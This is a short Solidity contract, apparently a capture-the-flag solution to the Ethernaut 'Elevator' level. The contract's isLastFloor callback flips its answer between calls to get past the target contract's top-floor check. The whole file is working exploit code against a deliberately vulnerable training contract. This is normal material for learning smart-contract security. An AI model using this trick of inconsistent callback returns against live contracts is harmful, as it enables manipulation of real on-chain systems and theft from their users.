pragma solidity ^0.6.0;

import '../levels/Elevator.sol';

contract ElevatorAttack {

    bool floor;
    Elevator elevator;

    constructor(address elevatorAddress) public {
        elevator = Elevator(elevatorAddress);
        floor = false;
    }

    function isLastFloor(uint _floor) external returns (bool) {
        _floor;
        bool tmp = floor;
        floor = !floor;
        return tmp;
    }

    function run() public {
        elevator.goTo(0);
    }

}
